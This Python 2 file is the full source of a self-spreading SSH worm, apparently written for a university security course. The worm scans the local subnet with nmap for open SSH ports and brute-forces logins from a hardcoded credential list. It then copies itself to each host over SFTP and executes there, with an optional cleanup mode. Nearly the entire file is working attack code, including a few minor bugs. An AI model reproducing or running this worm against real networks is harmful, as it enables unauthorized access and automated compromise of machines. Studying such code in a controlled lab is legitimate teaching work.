import paramiko
import sys
import socket
import nmap
import netinfo
import os


# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
LOCAL_PATH = "/tmp"
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	return os.path.exists(INFECTED_MARKER_FILE)

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	with open(INFECTED_MARKER_FILE, 'w')as f:
		f.write("You've got Worms")

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself.

	# Instantiate file transfer object
	sftp = sshClient.open_sftp()
	# Need full path and file name to not fck up
	sftp.put("/tmp/worm.py", "/tmp/worm.py")
	# If this machine is not infected (Means it should be attacker machine)
	if not isInfectedSystem():
		# You have to create the file
		sftpfile = sftp.file(INFECTED_MARKER_FILE,'w')
		sftpfile.write("You've got Worms")
		sftpfile.close()
	# Otherwise it's a victim machine that should have the infect_mark_file
	else:
		sftp.put(INFECTED_MARKER_FILE,INFECTED_MARKER_FILE)
	# I don't think you need to make a .py file executable like a .sh file but w/e
	stds1 = sshClient.exec_command("chmod /tmp/worm.py 777")
	# Execute on victim machine
	stds2 = sshClient.exec_command("python /tmp/worm.py")
	# Close sftp and ssh objects
	sftp.close()
	sshClient.close()


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	try:
		sshClient.connect(host,22,userName,password)
	except socket.error:
		return 3
	except paramiko.SSHException:
		return 1
	return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	print "Attempting to connect to " + host
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		attemptResults = tryCredentials(host,username, password,ssh)
		if attemptResults == 0:
			print "Accessed " + host
			return ssh
		if attemptResults == 3:
			print "Server Down or not running SSH"
		if attemptResults == 1:
			print "Wrong Credentials"

	# Could not find working credentials
	print "Could not find working credentials for " + host

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP():
	
	# Change this to retrieve and
	# return the IP of the current system.
    # The IP address
    for dev in netinfo.list_active_devs():
        # The IP address of the interface
        addr = netinfo.get_ip(dev)
        # Get the IP address
        if not addr == "127.0.0.1":
            # Save the IP address and break
            return addr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
# ** I added the current machines IP as an argument so
# ** we don't have to hard code the subnet
#######################################################
def getHostsOnTheSameNetwork(myip):
	
	# Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there).
	portScanner.scan(myip + '/24', arguments='-p 22 --open')
	
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)

	return liveHosts

#######################################################
# Clean by removing the marker and copied worm program
# @param sshClient - the instance of the SSH client 
# connected to the victim system
#######################################################
def cleaner(sshClient): 
	
	# remove the infection (i.e. marker file) from the host
	# remove the worm program from the host
	sftp = sshClient.open_sftp()
	sftp.remove(LOCAL_PATH + "/worm.py")
	sftp.remove(INFECTED_MARKER_FILE)


# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP.

if len(sys.argv) < 2 and not(sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
	
	# If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice.
	if isInfectedSystem():
		exit

#Get the IP of the current system
currentIP = getMyIP()

# Get the hosts on the same network
# ** Pass current machines IP for dynamic subnet stuff
networkHosts = getHostsOnTheSameNetwork(currentIP)

# Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
networkHosts.remove(currentIP)
print "Found hosts: ", networkHosts


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	
	# Did the attack succeed?
	if sshInfo:
		# the comma means print with no new line
		print "sshInfo: ",
		print sshInfo
		
		# Check if the system was	
		# already infected. This can be
		# done by checking whether the
		# remote system contains /tmp/infected.txt
		# file (which the worm will place there
		# when it first infects the system)
		# This can be done using code similar to
		# the code below:
		# try:
	        #	 remotepath = '/tmp/infected.txt'
		#        LOCAL_PATH = '/home/cpsc/'
		#	 # Copy the file from the specified
		#	 # remote path to the specified
		# 	 # local path. If the file does NOT exist
		#	 # at the remote path, then get()
		# 	 # will throw IOError exception
		# 	 # (that is, we know the system is
		# 	 # not yet infected).
		# 
		#        sftp.get(filepath, LOCAL_PATH)
		# except IOError:
		#       print "This system should be infected"
		#
		#
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system

		# 
		sftp = sshInfo.open_sftp()
		try:
			# Try to fetch marker file from victim
			# Better way to check if victim machine is infected
			# Will throw IOError if it does not exist
			sftp.stat(INFECTED_MARKER_FILE)

			# If it fails, next lines will be skipped and start after "except IOError:" and we can attack victim system
			# If it exists:
			print host + " infected"
			sftp.close()
			# We now know victim is infected
			# If an argument to command line is added and it's -c||--clean we will clean instead of infect
			if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
				print "Cleaning " + host
				cleaner(sshInfo)
				print ' ' +  host + ' successfully cleaned'
			
			sshInfo.close()
		# INFECTED_MARKER_FILE does not exist, spread & Exe
		except IOError:
			sftp.close()
			# If victim machine isn't yet infected and we want to clean, do nothing
			if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
				print host + " not infected, leaving alone"
			# Else we want to fck this shit up
			else:
				print "Trying to spread..."
				spreadAndExecute(sshInfo)
				print "worm successfully sent to " + host
	else:
		print "No sshInfo"

# If command line args exist and are -c||--clean
if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
	# If argument is added and this machine is infected, then we are a victim machine
	if isInfectedSystem():
		# This will throw an OSError if the file does not exist
		os.remove(INFECTED_MARKER_FILE)
	# If we are not infected then we are the original cleaning machine
	print "Cleaning Complete"
else:
	print " Spreading Complete"
	


